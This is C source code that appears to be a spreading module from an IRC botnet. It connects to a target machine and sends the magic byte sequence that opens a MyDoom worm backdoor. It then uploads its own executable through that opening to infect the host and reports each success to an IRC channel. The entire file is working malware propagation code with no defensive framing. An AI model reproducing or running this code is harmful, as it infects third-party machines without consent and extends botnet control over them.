#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MYDOOM

BYTE MyDoomTrailor[] = "\x85\x13\x3c\x9e\xa2";

BOOL MyDoom(EXINFO exinfo)
{
	char buffer[IRCLINE], botfile[MAX_PATH], szBuffer[1024];

	BOOL success = FALSE;

	WSADATA WSAData; 
	if (fWSAStartup(MAKEWORD(1,1), &WSAData)!=0) 
		return FALSE; 

	
	SOCKET sSock;
	if((sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
		ssin.sin_port = fhtons((unsigned short)exinfo.port);

		if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if(fsend(sSock, (char*)MyDoomTrailor, 5, 0) == 5) {
				GetModuleFileName(0,botfile,MAX_PATH);
	
				FILE* pFile;
				if((pFile = fopen(botfile, "rb")) == NULL) 
					return FALSE;

				while(!feof(pFile)) {
					int nRead = fread(szBuffer, 1, sizeof(szBuffer), pFile);
					int nSent = fsend(sSock, szBuffer, nRead, 0);

					if(nRead != nSent) {
						fclose(pFile);
						fclosesocket(sSock);
						fWSACleanup();		
						return FALSE;
					}
				}
				fclose(pFile);
				success = TRUE;
			}
		}
	}

	fclosesocket(sSock);
	fWSACleanup();

	if (success) {
		_snprintf(buffer, sizeof(buffer), "%s// [Exploiting] IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
		irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;
	}

	return TRUE;
}
#endif